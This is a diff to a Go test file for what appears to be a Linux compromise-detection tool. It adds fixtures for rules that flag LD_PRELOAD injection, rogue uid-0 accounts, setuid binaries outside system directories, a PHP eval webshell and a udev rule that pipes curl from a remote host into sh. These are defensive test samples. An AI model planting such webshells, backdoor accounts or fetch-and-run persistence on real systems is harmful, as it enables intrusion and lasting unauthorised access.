@@ -4,6 +4,8 @@ import (
 	"slices"
 	"testing"
 
+	"karma/internal/model"
+	"karma/internal/reader"
 	"karma/internal/testkit"
 )
 
@@ -16,10 +18,14 @@ func TestLinuxCheckRules(t *testing.T) {
 		text  string
 		want  string
 	}{
-		{"env", `LD_PRELOAD=/tmp/preload.so`, "env-ld-preload"},
+		{"env", `LD_PRELOAD=/tmp/preload.so`, "ld-preload-var"},
+		{"cron", `*/5 * * * * LD_PRELOAD=/tmp/.x.so /usr/sbin/backuptool`, "ld-preload-var"},
+		{"shell-rc", `export LD_AUDIT=/tmp/audit.so`, "ld-preload-var"},
 		{"env", `PATH=/usr/local/bin:/usr/bin:`, "env-path-dot"},
 		{"env", `PYTHONPATH=/tmp/evil`, "env-python-path"},
 		{"accounts", `backdoor:x:0:0::/:/bin/sh`, "acct-other-uid0"},
+		{"accounts", `toor:x:0:1000::/:/bin/bash`, "acct-other-uid0"},
+		{"accounts", `backdoor:x:0:0::/:/usr/sbin/nologin`, "acct-other-uid0"},
 		{"accounts", `mysql:x:997:997::/var/lib/mysql:/bin/bash`, "acct-login-shell"},
 		{"shadow", `root::18900:0:99999:7:::`, "shadow-empty-root"},
 		{"shadow", `svc::18900:0:99999:7:::`, "shadow-empty"},
@@ -64,7 +70,9 @@ func TestLinuxCheckRules(t *testing.T) {
 		{"key-dirs", `-rw------- 1 root root 1679 Jun  1 10:00 /root/.ssh/authorized_keys`, "ssh-material"},
 		{"key-dirs", `drwxr-xr-x 1 root root 4096 Jun  1 10:00 /opt/chisel`, "tunnel-tool"},
 		{"suid", `/home/deploy/find`, "suid-gtfobins"},
+		{"suid", `/tmp/evil`, "suid-outside-system"},
 		{"sgid", `/home/deploy/find`, "sgid-gtfobins"},
+		{"sgid", `/var/lib/p`, "sgid-outside-system"},
 		{"web-dirs", `/var/www/html/shell.php`, "web-script"},
 		{"webshell-grep", `<?php @eval($_POST['c']); ?>`, "webshell-direct"},
 		{"caps", `/usr/bin/x cap_setuid=ep`, "caps-setuid"},
@@ -102,11 +110,86 @@ func TestLinuxRuleExclusions(t *testing.T) {
 		{"hosts-file", `127.0.0.1 localhost`, "hosts-nonlocal"},
 		{"env", `PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin`, "env-path-dot"},
 		{"pkg-verify", `..5?????? c /etc/hosts`, "bin-not-elf"},
+		{"suid", `/usr/bin/sudo`, "suid-outside-system"},
+		{"suid", `/usr/lib/openssh/ssh-keysign`, "suid-outside-system"},
+		{"suid", `/usr/lib64/x`, "suid-outside-system"},
+		{"suid", `/usr/libexec/y`, "suid-outside-system"},
+		{"suid", `/usr/local/bin/z`, "suid-outside-system"},
+		{"sgid", `/usr/lib/x86_64-linux-gnu/utempter/utempter`, "sgid-outside-system"},
 	}
 	for _, tc := range cases {
 		check := testkit.CheckByID(t, All, tc.check)
 		if slices.Contains(testkit.HitIDs(t, tc.text, check), tc.quiet) {
 			t.Errorf("%s must stay quiet on: %q (%s)", tc.check, tc.text, tc.quiet)
+		}
+	}
+}
+
+// The special-bit rules divide the listing: a setuid/setgid binary under the
+// system program directories is a stock install, and one anywhere else — the
+// backdoor's classic placement — lights the outside-system rule.
+func TestSpecialBitsOutsideSystemDirs(t *testing.T) {
+	suid, sgid := testkit.CheckByID(t, All, "suid"), testkit.CheckByID(t, All, "sgid")
+	flagged := map[*model.Check][]struct{ path, rule string }{
+		suid: {
+			{"/tmp/evil", "suid-outside-system"},
+			{"/home/deploy/find", "suid-outside-system"},
+			{"/opt/vendor/helper", "suid-outside-system"},
+			{"/var/lib/p", "suid-outside-system"},
+		},
+		sgid: {
+			{"/usr/local/share/x", "sgid-outside-system"},
+			{"/srv/backup/tool", "sgid-outside-system"},
+		},
+	}
+	for check, entries := range flagged {
+		for _, entry := range entries {
+			if !slices.Contains(testkit.HitIDs(t, entry.path, check), entry.rule) {
+				t.Errorf("%s should light %s on %s", check.ID, entry.rule, entry.path)
+			}
+		}
+	}
+}
+
+// A rule's span is what the panel paints, so it must cover the whole token the
+// reason names; a pattern that stopped after the first character painted half of
+// a path or a hostname.
+func TestLinuxRuleSpansCoverTheToken(t *testing.T) {
+	cases := []struct {
+		check string
+		text  string
+		rule  string
+		want  string
+	}{
+		{"cron", `10 * * * * root /etc/.help.sh`, "hidden-nonhome-path", "/etc/.help.sh"},
+		{"cron", `*/5 * * * * /tmp/.x`, "hidden-tmp-path", "/tmp/.x"},
+		{"hosts-file", `172.17.0.6 cace4a393ea9`, "hosts-nonlocal", "172.17.0.6 cace4a393ea9"},
+		{"hosts-file", `172.17.0.6 evil.corp  # note`, "hosts-nonlocal", "172.17.0.6 evil.corp"},
+		{"caps", `/usr/bin/x cap_setuid=ep`, "caps-setuid", "cap_setuid=ep"},
+		{"caps", `/usr/bin/x cap_net_raw=ep`, "caps-present", "cap_net_raw=ep"},
+		{"cwd-tmp", `/proc/1234 -> /tmp/evil/x.sh`, "proc-cwd-tmp", "/proc/1234 -> /tmp/evil/x.sh"},
+		{"udev-rules", `RUN+="/bin/sh -c 'curl http://10.0.0.8/x|sh'"`, "udev-exec-key",
+			`RUN+="/bin/sh -c 'curl http://10.0.0.8/x|sh'"`},
+	}
+	for _, tc := range cases {
+		check := testkit.CheckByID(t, All, tc.check)
+		document := reader.Analyze(tc.text, check.Rules, check.Filters, check.Normalize, 0)
+		spans := 0
+		for _, section := range document.Sections {
+			for _, line := range section.Lines {
+				for _, match := range line.Matches {
+					if match.ID != tc.rule {
+						continue
+					}
+					spans++
+					if got := line.Text[match.Start:match.End]; got != tc.want {
+						t.Errorf("%s %s paints %q, want %q", tc.check, tc.rule, got, tc.want)
+					}
+				}
+			}
+		}
+		if spans == 0 {
+			t.Errorf("%s should light %s: %q", tc.check, tc.rule, tc.text)
 		}
 	}
 }
